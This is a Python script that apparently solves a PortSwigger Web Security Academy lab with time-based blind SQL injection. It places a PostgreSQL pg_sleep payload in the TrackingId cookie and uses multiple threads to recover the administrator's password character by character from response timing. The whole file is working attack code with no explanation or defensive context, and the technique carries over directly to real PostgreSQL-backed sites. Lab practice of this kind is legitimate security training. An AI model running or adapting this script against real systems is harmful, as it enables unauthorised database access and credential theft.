import requests
import urllib3
import threading
import time

# Suppress the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_host = '0a0c00d10499446e8253fbfd00a9003f.web-security-academy.net'
url = f'https://{target_host}/'

headers = {
    'Host': target_host,
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

results = []

def try_chr():
    cookies = dict()
    cookies['session'] = 'y0oQsT4wBlBdpSO70ihjWlTRx6tVuiOX'
    size = 20
    threads = []

    def process(i):
        num_chr = 48
        sleep_sec = 10
        while num_chr < 128:
            cookies['TrackingId'] = f"""'%3b+SELECT+CASE+WHEN((SELECT+SUBSTRING(password,{i+1},1)+FROM+users+WHERE+username='administrator')=CHR({num_chr}))+THEN+pg_sleep({sleep_sec})+ELSE+pg_sleep(0)+END+--+"""
            #print(cookies['TrackingId'])

            tic = time.time()
            response = requests.get(url, headers=headers, cookies=cookies, verify=False)
            toc = time.time()

            #import ipdb; ipdb.set_trace()
            #print(f"Char #{i+1:02d}, num_chr={num_chr:d}, chr: \"{chr(num_chr)}\", time consumed: {toc-tic:.1f}s")
            if toc-tic>sleep_sec:
                #print(f"Char #{i+1:02d}, num_chr={num_chr:d}, chr: \"{chr(num_chr)}\", time consumed: {toc-tic:.1f}s")
                print(f"{i+1:02d}: {chr(num_chr)}")
                results.append((i+1, chr(num_chr)))
                break
            else:
                num_chr += 1
        if num_chr == 128:
            print(f"__{i+1:02d}:NULL:{i+1:02d}__")
            results.append((i+1, f"__{i+1:02d}:NULL:{i+1:02d}__"))

    for i in range(size):
        t = threading.Thread(target=process, args=(i,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

import time

tic = time.time()
try_chr()

# Convert first element of each tuple to int for correct sorting, then sort
sorted_result = sorted(results, key=lambda x: x[0])

# Extract the second element from each tuple and join them into a string
final_string = ''.join(item[1] for item in sorted_result)

print(final_string)  # Output: c#Xs9

toc = time.time()
print(f"Time consumed: {toc-tic:.1f}s")
